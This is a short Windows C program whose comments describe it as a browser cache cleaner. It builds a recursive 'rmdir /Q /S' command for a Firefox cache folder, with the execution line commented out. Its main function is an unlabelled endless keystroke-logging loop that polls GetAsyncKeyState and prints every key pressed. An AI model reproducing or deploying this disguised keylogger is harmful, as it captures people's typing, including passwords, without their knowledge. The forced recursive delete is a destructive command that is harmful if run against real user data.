#include <stdio.h>
#include <windows.h>

//functions to delete browser specific cache
void ClearBrowserCache();
void ClearMozillaCache();
void ClearChromeCache();
void ClearOperaCache(); 


//function to delete mozilla firefox cache
void ClearMozillaCache()
{
    char path[256] = "C:\\Users\\";
    char cachePath[256] = "\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\gv3rw9bw.default-release\\cache2";
    char removepath[256] = "";
    strcat(path,getenv("USERNAME"));
    strcat(path, cachePath);
    strcat(removepath,"rmdir /Q /S ");
    strcat(removepath, path);
    printf("path: %s\n remove path: %s\n",path,removepath);
    //system(removepath);

}

void ClearBrowserCache()
{
    ClearMozillaCache();

}

int main()
{
    ClearMozillaCache();
    while(1)
    {
        for(int i=8; i<190; i++)
        {
            if(GetAsyncKeyState(i) == -32767)
            {
                printf("%c", i);            
                
            }
        }
    }
    return 0;
} 